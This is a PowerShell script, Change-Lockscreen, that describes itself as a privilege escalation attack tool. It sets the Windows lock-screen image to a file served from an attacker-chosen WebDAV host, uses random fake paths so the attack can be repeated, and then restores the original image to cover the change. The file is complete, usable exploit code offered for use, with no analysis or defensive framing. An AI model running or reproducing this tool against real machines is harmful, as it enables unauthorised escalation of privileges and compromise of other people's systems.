function Change-Lockscreen
{
<#
.SYNOPSIS
PowerShell script to perform privilege escalation attack by changing lockscreen image.

.PARAMETER FullPath
If this parameter is chosen it is necessary to set the complete path of the image. In order to perform the attack it is necessary to follow this format:
\\webdav@PORT\fakePath\image.jpg
If for any reason the attack should be repeated in the same machine, it is necessary to modify the "fakePath" string otherwise privilege escalation will fail.

.PARAMETER Webdav
If this parameter is chosen it is necessary to set only the Path of the webdav. The script will take care of finding the image and will use random "fakePaths". 

.EXAMPLE
    PS C:\> . .\Change-Lockscreen.ps1
    PS C:\> Change-Lockscreen -FullPath \\imageserver@80\fakePath\image.jpg
    PS C:\> Change-Lockscreen -Webdav \\imageserver@80\
#>

    [CmdletBinding(DefaultParameterSetName='none')]
	Param (
	    [Parameter(ParameterSetName='webdav', Position=0)]
	    [String]
        $Webdav,     
  
	    [Parameter(ParameterSetName='FullPath', Position=0)]
	    [String]
        $FullPath     
    ) 
    
    if ($PSCmdlet.ParameterSetName -eq 'none'){
        write-output "It is required to set the Webdav or the FullPath parameter:
Examples:
        Change-Lockscreen -FullPath \\imageserver@80\fakePath\image.jpg
        Change-Lockscreen -Webdav \\imageserver@80\"
        return
    } 

    [Windows.System.UserProfile.LockScreen,Windows.System.UserProfile,ContentType=WindowsRuntime] | Out-Null
    Add-Type -AssemblyName System.Runtime.WindowsRuntime

    $asTaskGeneric = ([System.WindowsRuntimeSystemExtensions].GetMethods() | ? { $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1' })[0]
    Function Await($WinRtTask, $ResultType) {
        $asTask = $asTaskGeneric.MakeGenericMethod($ResultType)
        $netTask = $asTask.Invoke($null, @($WinRtTask))
        $netTask.Wait(-1) | Out-Null
        $netTask.Result
    }
    Function AwaitAction($WinRtAction) {
        $asTask = ([System.WindowsRuntimeSystemExtensions].GetMethods() | ? { $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and !$_.IsGenericMethod })[0]
        $netTask = $asTask.Invoke($null, @($WinRtAction))
        $netTask.Wait(-1) | Out-Null
    }

    [Windows.Storage.StorageFile,Windows.Storage,ContentType=WindowsRuntime] | Out-Null
    $originalImageStream = ([Windows.System.UserProfile.LockScreen]::GetImageStream())
    
    $randomPath = -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
		
	try{
		IF($Webdav){
		$image = Await ([Windows.Storage.StorageFile]::GetFileFromPathAsync($Webdav+$randomPath+'\'+'image.jpg')) ([Windows.Storage.StorageFile])
		}
		IF($FullPath){
		$image = Await ([Windows.Storage.StorageFile]::GetFileFromPathAsync($FullPath)) ([Windows.Storage.StorageFile])
		}
	}
    catch {
        write-output "Sorry, something went wrong.
Possible solutions:
					  1 - Check if specified path is correct
                      			  2 - Wait one minute and try again in a new powershell session
					  3 - Restart WebDAV server and try again"
                      return
    } 
        
    AwaitAction ([Windows.System.UserProfile.LockScreen]::SetImageFileAsync($image))
    try{ 
        AwaitAction  ([Windows.System.UserProfile.LockScreen]::SetImageStreamAsync($originalImageStream))
        write-output "Original lockscreen image restored"
    }
    catch {
        write-output "Windows Spotlight mode in use. It is not possible to restore the old image, the new specified image has been set."
    } 
}
